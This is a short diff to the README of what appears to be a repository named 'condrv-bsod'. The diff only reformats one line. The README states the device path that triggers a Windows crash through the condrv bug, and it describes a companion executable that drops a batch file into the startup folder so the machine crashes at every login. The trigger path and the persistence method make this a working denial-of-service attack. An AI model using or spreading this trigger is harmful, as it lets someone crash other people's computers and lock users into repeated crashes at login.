@@ -1,7 +1,7 @@
 # condrv-bsod
 
 Uses the condrv bug to crash Windows
-### \\.\globalroot\device\condrv\kernelconnect
+> \\.\globalroot\device\condrv\kernelconnect
 <br/>
 <br/>
 bsoduserstartup.exe: places a batch with the path inside in shell:startup (crash at login)
